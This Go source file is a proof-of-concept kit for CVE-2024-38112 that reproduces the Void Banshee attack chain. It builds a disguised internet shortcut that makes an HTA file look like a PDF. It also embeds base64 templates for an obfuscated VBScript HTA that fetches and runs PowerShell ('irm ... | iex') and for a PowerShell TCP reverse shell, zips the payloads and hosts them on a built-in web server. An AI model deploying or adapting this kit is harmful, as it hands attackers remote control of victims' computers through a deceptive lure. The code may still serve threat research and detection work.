package main

// Use the GOPATH for development and then transition over to the prep script
// go env -w GOPATH="/home/thepcn3rd/go/workspaces/cve-2024-38112"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o urlShortcut.bin -ldflags "-w -s" main.go

/*
PoC of CVE-2024-38112 - Attack chain of Void Banshee to exploit the vulnerability

1. Create URL that appears as a PDF but with an hta extension
2. Create the hta file that is downloaded by the .url click
3. Create the powershell file that is invoked by the vbs in the .hta file
- a. Identify how to generate the vbs programtically
- b. Set xor options when available
4. Create the reverseshell file that is loaded through the powershell execution
5. Place URL in a .url file
6. Create a zip file with the .url file embedded


References:
https://research.checkpoint.com/2024/resurrecting-internet-explorer-threat-actors-using-zero-day-tricks-in-internet-shortcut-file-to-lure-victims-cve-2024-38112/
https://www.trendmicro.com/en_us/research/24/g/CVE-2024-38112-void-banshee.html
https://stackoverflow.com/questions/40531374/open-internet-explorer-from-chrome-using-a-protocol-handler-ieurl
https://app.any.run/tasks/8b457842-4e37-44f5-9a75-3d4ac9fb98fa?_gl=1%2A1osza6x%2A_gcl_au%2AMzQyMTk0NDc3LjE3MjExNzkxNzI.%2A_ga%2AMzQxODY5NDAzLjE3MjExNzkxNzI.%2A_ga_53KB74YDZR%2AMTcyMTE3OTE3Mi4xLjEuMTcyMTE3OTM4NS4wLjAuMjg1Mzg4ODkx%2F
https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)?redirectedfrom=MSDN
https://lolbas-project.github.io/lolbas/Binaries/Mshta/


MITRE:
T1204.002 - User Execution: Malicious File
T1218 - System Binary Proxy Execution

Create a protocol handler for IE or Edge... (Create a file.reg with the below contents)
---
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\ie]
"URL Protocol"="\"\""
@="\"URL:IE Protocol\""

[HKEY_CURRENT_USER\Software\Classes\ie\DefaultIcon]
@="\"explorer.exe,1\""

[HKEY_CURRENT_USER\Software\Classes\ie\shell]

[HKEY_CURRENT_USER\Software\Classes\ie\shell\open]

[HKEY_CURRENT_USER\Software\Classes\ie\shell\open\command]
@="cmd /k set myvar=%1 & call set myvar=%%myvar:ie:=%% & call \"C:\\windows\\system32\\mshta.exe\" %%myvar%% & exit /B"
---
Run the above and then you can call ie:http://127.0.0.1/file.xyz.hta and it opens with mshta.exe...  It is ugly but it works with this PoC


*/

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"unicode"

	cf "github.com/thepcn3rd/goAdventures/projects/commonFunctions"
)

type configStruct struct {
	URLInfo   urlInfoStruct   `json:"urlInfo"`
	HTAInfo   htaInfoStruct   `json:"htaInfo"`
	PWSHInfo  pwshInfoStruct  `json:"pwshInfo"`
	WebServer webServerStruct `json:"webServer"`
}

type urlInfoStruct struct {
	URLFilename string `json:"urlFilename"`
	ZipFilename string `json:"zipFilename"`
	// Note the %E2%A0%80 are non-printable characters to a web server, they will be a space in a filename
	// The number of the %E2%A0%80 in the URL will be the number of spaces in your htaFilename
	URL string `json:"url"`
}

type htaInfoStruct struct {
	PwshURL     string `json:"pwshURL"`
	HTAFilename string `json:"htaFilename"`
	// The number of spaces in the filename should be equivalent to the number of %E2%A0%80 characters in the URL
	// The filename needs to match, you can take the URL and do URL decode in Cyber Chef and it should output the correct length of the htafilename
	HTAZipFilename   string `json:"htaZipFilename"`
	TemplateFilename string `json:"templateFilename"`
}

type pwshInfoStruct struct {
	PwshFilename string `json:"pwshFilename"`
	// The pwshFilename needs to be the same as in the PwshURL
	PwshZipFilename string `json:"pwshZipFilename"`
	PwshTemplate    string `json:"pwshTemplate"`
	RevShellIP      string `json:"revShellIP"`
	RevShellPort    string `json:"revShellPort"`
}

type webServerStruct struct {
	LaunchWebServer string `json:"launchWebServer"`
	WebServerIP     string `json:"webServerIP"`
	// Currently the webserver that launches does not support encryption
	WebServerPort string `json:"webServerPort"`
}

func loadConfigFile(fileName string) configStruct {
	// Verify a struct is named configStruct and that a flag is read for the configuration and the following exists in the usage of this...
	/*
		var config configStruct

		ConfigPtr := flag.String("conf", "config.json", "Configuration file to read")
		flag.Parse()

		config = loadConfigFile(*ConfigPtr)
	*/
	// Load the config.json or the file specified
	fmt.Println("Loading the following config file: " + fileName + "\n")
	configFile, err := os.Open(fileName)
	cf.CheckError("Unable to open the configuration file", err, true)
	defer configFile.Close()
	decoder := json.NewDecoder(configFile)
	var config configStruct
	if err := decoder.Decode(&config); err != nil {
		cf.CheckError("Unable to decode the configuration file", err, true)
	}
	return config
}

func createShortcut(c configStruct) {
	var content string

	content += "[{000214A0-0000-0000-C000-000000000046}]\n"
	content += "Prop3=19,0\n"
	content += "[InternetShortcut]\n"
	content += "IDList=\n"
	content += fmt.Sprintf("URL=mhtml:%s!x-usc:%s\n", c.URLInfo.URL, c.URLInfo.URL)
	content += "HotKey=0\n"
	content += "IconIndex=13\n"
	content += "IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"

	//fmt.Println(*filenameFlag)
	file, err := os.Create(c.URLInfo.URLFilename)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("Shortcut created successfully!")
}

func isPrintable(s string) bool {
	for _, char := range s {
		if !unicode.IsPrint(char) {
			return false
		}
	}
	return true
}

func xorString(stringChars string) (string, string) {
	// Define a letter of the alphabet
	xorChars := []byte{0x04, 0x03, 0x02, 0x01, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}
	var outputBytes []byte
	var outputChars string
	var xorValue byte
	for a := 0; a < len(xorChars); a++ {
		for i := 0; i < len(stringChars); i++ {
			letter := byte(stringChars[i])

			// Define a byte value to XOR with
			xorValue = byte(xorChars[a]) // Example value

			// Perform the XOR operation
			result := letter ^ xorValue

			// Print the results
			//fmt.Printf("Original letter: %c (0x%X)\n", letter, letter)
			//fmt.Printf("XOR value: 0x%X\n", xorValue)
			//fmt.Printf("Result: %c (0x%X)\n", result, result)
			outputBytes = append(outputBytes, result)
			//outputChars += fmt.Sprintf("%c", result)
		}
		if isPrintable(outputChars) {
			break
		}
	}
	fmt.Printf("URL: %s\n", stringChars)
	fmt.Printf("XOR Result: %s - Key: 0x%X\n\n", string(outputBytes), xorValue)
	return string(outputBytes), fmt.Sprintf("%X", xorValue)
}

func createHTAFile(x string, key string, templateFilename string, destFilename string) {
	sourceFile, err := os.Open(templateFilename)
	cf.CheckError("Error opening template file", err, true)
	defer sourceFile.Close()

	destinationFile, err := os.Create(destFilename)
	cf.CheckError("Error creating destination file", err, true)
	defer destinationFile.Close()

	scanner := bufio.NewScanner(sourceFile)
	writer := bufio.NewWriter(destinationFile)

	// Read line from source file and write to the destination file
	for scanner.Scan() {
		line := scanner.Text()
		line = strings.Replace(line, "XORSTRING", x, 1)
		line = strings.Replace(line, "XORKEY", key, 1)
		_, err := writer.WriteString(line + "\n")
		cf.CheckError("Error writing to destination file", err, true)
	}

	// Check for errors during scanning
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from source file", err)
	}

	// Flush any buffered data to the destination file
	if err := writer.Flush(); err != nil {
		fmt.Println("Error flushing to destination file", err)
	}
}

func createPWSHFile(ip string, port string, templateFilename string, destFilename string) {
	sourceFile, err := os.Open(templateFilename)
	cf.CheckError("Error opening template file - pwsh", err, true)
	defer sourceFile.Close()

	destinationFile, err := os.Create(destFilename)
	cf.CheckError("Error creating destination file", err, true)
	defer destinationFile.Close()

	scanner := bufio.NewScanner(sourceFile)
	writer := bufio.NewWriter(destinationFile)

	// Read line from source file and write to the destination file
	for scanner.Scan() {
		line := scanner.Text()
		line = strings.Replace(line, "REVSHELLIP", ip, 1)
		line = strings.Replace(line, "REVSHELLPORT", port, 1)
		_, err := writer.WriteString(line + "\n")
		cf.CheckError("Error writing to destination file", err, true)
	}

	// Check for errors during scanning
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from source file", err)
	}

	// Flush any buffered data to the destination file
	if err := writer.Flush(); err != nil {
		fmt.Println("Error flushing to destination file", err)
	}
	fmt.Printf("Setup the reverse shell to connect to %s:%s\n", ip, port)
	fmt.Printf("Start your listeners...\n")
}

func main() {
	var config configStruct
	var xorOutputString string
	var xorKeyValue string

	ConfigPtr := flag.String("conf", "config.json", "Configuration file to read")
	flag.Parse()

	cf.CreateDefaultConfig("ewoJInVybEluZm8iOiB7CgkJInVybEZpbGVuYW1lIjogIm9wZW4udXJsIiwKCQkiemlwRmlsZW5hbWUiOiAib3Blbi56aXAiLAoJCSJ1cmwiOiAiaHR0cHM6Ly8xMjcuMC4wLjEvQm9vay5wZGYlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAlRTIlQTAlODAuaHRhIgoJCX0sCgkiaHRhSW5mbyI6IHsKCQkicHdzaFVSTCI6ICJodHRwczovLzEyNy4wLjAuMS9leGVjdXRlLnBzMSIsCgkJImh0YUZpbGVuYW1lIjogIkJvb2sucGRmICAgICAgICAgICAgICAgICAgICAgICAgICAuaHRhIiwKCQkiaHRhWmlwRmlsZW5hbWUiOiAiQm9vay56aXAiLAoJCSJ0ZW1wbGF0ZUZpbGVuYW1lIjogInRlbXBsYXRlLmh0YS50eHQiCgkJfSwKCSJwd3NoSW5mbyI6IHsKCQkicHdzaEZpbGVuYW1lIjogImV4ZWN1dGUucHMxIiwKCQkicHdzaFppcEZpbGVuYW1lIjogImV4ZWN1dGUuemlwIiwKCQkicHdzaFRlbXBsYXRlIjogInRlbXBsYXRlLnJldnNoZWxsLnR4dCIsCgkJInJldlNoZWxsSVAiOiAiMTI3LjAuMC4xIiwKCQkicmV2U2hlbGxQb3J0IjogIjgwOTAiCgkJfSwKCSJ3ZWJTZXJ2ZXIiOiB7CgkJImxhdW5jaFdlYlNlcnZlciI6ICJ0cnVlIiwKCQkid2ViU2VydmVySVAiOiAiMTI3LjAuMC4xIiwKCQkid2ViU2VydmVyUG9ydCI6ICI4MDAwIgoJCX0KfQo=") // Create a default config.json if it does not exist
	config = loadConfigFile(*ConfigPtr)

	// Create the webserver directory
	if config.WebServer.LaunchWebServer == "true" {
		cf.CreateDirectory("/static")
	}

	createShortcut(config)
	cf.ZipCompression(config.URLInfo.URLFilename, config.URLInfo.ZipFilename)

	// If the HTA template file does not exist it is created
	cf.CreateFileFromB64("ICAgIDxodGE6YXBwbGljYXRpb24KICAgICAgICAgICAgSUQ9IldFTFNPTkpTX1dJTkRPVyIKICAgICAgICAgICAgVmVyc2lvbj0iMC4yLjcuMiIKICAgICAgICAgICAgQXBwbGljYXRpb25OYW1lPSJXZWxzb25KUyIKICAgICAgICAgICAgQm9yZGVyPSJOb25lIgogICAgICAgICAgICBCb3JkZXJTdHlsZT0iU3RhdGljIgogICAgICAgICAgICBJbm5lckJvcmRlcj0iTm8iCiAgICAgICAgICAgIENhcHRpb249Ik5vIgogICAgICAgICAgICBJY29uPSJhcHAvZmF2aWNvbi5pY28iCiAgICAgICAgICAgIENvbnRleHRNZW51PSJObyIKICAgICAgICAgICAgTWF4aW1pemVCdXR0b249Ik5vIgogICAgICAgICAgICBNaW5pbWl6ZUJ1dHRvbj0iTm8iCiAgICAgICAgICAgIE5hdmlnYWJsZT0iTm8iCiAgICAgICAgICAgIFNjcm9sbD0iTm8iCiAgICAgICAgICAgIFNjcm9sbEZsYXQ9IlllcyIKICAgICAgICAgICAgU2VsZWN0aW9uPSJObyIKICAgICAgICAgICAgU2hvd0luVGFza2Jhcj0iWWVzIgogICAgICAgICAgICBTaW5nbGVJbnN0YW5jZT0iWWVzIgogICAgICAgICAgICBTeXNNZW51PSJZZXMiCiAgICAgICAgICAgIFdpbmRvd1N0YXRlPSJtaW5pbWl6ZSIKICAgICAgICAgICAgU2VsZWN0aW9uPSJObyIKICAgICAgICAgICAgLz4KICAgICAgICAgIDxzY3JpcHQgbGFuZ3VhZ2U9IlZCU2NyaXB0Ij4KRGltIGFnZTM0CkZvciBlbm91Z2g3ID0gMSBUbyBMZW4oIlhPUlNUUklORyIpCiAgICAgICAgYWdlMzQgPSBhZ2UzNCAmIENocihBc2MoTWlkKCJYT1JTVFJJTkciLCBlbm91Z2g3LCAxKSkgWG9yIFhPUktFWSkKTmV4dAoKICAgICAgICBEaW0gbWFzdGVyNjgKRm9yIG1hc3RlcjY4MSA9IDEgVG8gTGVuKCJzbWppY2lwdz5YWCpYdmtrcFhnbWlyNiIpCiAgICAgICAgbWFzdGVyNjggPSBtYXN0ZXI2OCAmIENocihBc2MoTWlkKCJzbWppY2lwdz5YWCpYdmtrcFhnbWlyNiIsIG1hc3RlcjY4MSwgMSkpIFhvciA0KQpOZXh0CgogRGltIGFuY2llbnQyNgpGb3IgYW5jaWVudDI2MSA9IDEgVG8gTGVuKCJTbWo3NltUdmtnYXd3IikKICAgICAgICBhbmNpZW50MjYgPSBhbmNpZW50MjYgJiBDaHIoQXNjKE1pZCgiU21qNzZbVHZrZ2F3dyIsIGFuY2llbnQyNjEsIDEpKSBYb3IgNCkKTmV4dAoKICAgICAgICAgICAgU2V0IG11c3Q0MSA9ICAgICAgICBHZXRPYmplY3QobWFzdGVyNjgpCiAgICAgICAgICAgIFNldCB3aXJlNTcgPSBtdXN0NDEuR2V0KGFuY2llbnQyNikKCiAgICAgICAgICAgIGludFJldHVybiA9IHdpcmU1Ny5DcmVhdGUoYWdlMzQsIE51bGwsIE51bGwsIGludFByb2Nlc3NJRCkKPC9zY3JpcHQ+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CnZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy5nb29nbGUuY29tJywgdHJ1ZSk7Cnhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsKCn07Cnhoci5zZW5kKCk7Cjwvc2NyaXB0PgogICAgICAgIDx0aXRsZT5XZWxjb21lIHRvIFdlbHNvbkpTIGFwcGxpY2F0aW9uPC90aXRsZT4KdGVtcGxhdGUK", "template.hta.txt")
	xorOutputString, xorKeyValue = xorString("powershell irm " + config.HTAInfo.PwshURL + " | iex")
	createHTAFile(xorOutputString, xorKeyValue, config.HTAInfo.TemplateFilename, config.HTAInfo.HTAFilename)
	cf.ZipCompression(config.HTAInfo.HTAFilename, config.HTAInfo.HTAZipFilename)

	// If the powershell reverse shell template file does not exist it is created
	cf.CreateFileFromB64("JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnUkVWU0hFTExJUCcsUkVWU0hFTExQT1JUKTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKSB7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZT0oW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCk7fTskY2xpZW50LkNsb3NlKCk7Cg==", "template.revshell.txt")
	createPWSHFile(config.PWSHInfo.RevShellIP, config.PWSHInfo.RevShellPort, config.PWSHInfo.PwshTemplate, config.PWSHInfo.PwshFilename)
	cf.ZipCompression(config.PWSHInfo.PwshFilename, config.PWSHInfo.PwshZipFilename)

	// Execute a web server in the background to host the files...
	// Verify the configuration does not use encryption if using this web server
	if config.WebServer.LaunchWebServer == "true" {

		// Define the web server handler
		// Verify that the files to be downloaded are in the static folder
		http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			http.FileServer(http.Dir("./static")).ServeHTTP(w, r)
		})

		// Run the web server in a Goroutine
		go func() {
			portInfo := config.WebServer.WebServerIP + ":" + config.WebServer.WebServerPort
			if err := http.ListenAndServe(portInfo, nil); err != nil {
				fmt.Printf("Failed to start server: %v\n", err)
			}
		}()
	}

	var inputStop string
	fmt.Print("Type \"end\" to stop the web server and hit enter: ")
	_, err := fmt.Scanln(&inputStop)
	if err != nil {
		fmt.Println("Error reading input:", err)
		return
	}
}
